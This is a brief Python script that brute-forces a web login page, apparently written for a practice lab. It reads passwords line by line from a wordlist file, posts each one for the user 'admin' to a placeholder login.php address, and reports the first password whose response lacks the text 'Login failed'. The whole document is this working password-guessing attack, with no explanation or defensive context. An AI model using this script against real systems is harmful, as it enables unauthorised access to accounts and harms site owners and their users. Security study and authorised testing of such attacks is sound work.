#!/usr/bin/env python
import requests

target_url = "http://IP/login.php"
data_url = {"username":"admin", "password":"22", "Login":"submit"}

with open("/root/pass.txt", "r") as passwords:
    for line in passwords:
        password = line.strip()
        data_url["password"] = password
        response = requests.post(target_url, data = data_url)
        if "Login failed" not in response.text:
            print("[-]password Found ---> " + password)
            exit()
print("no pass found")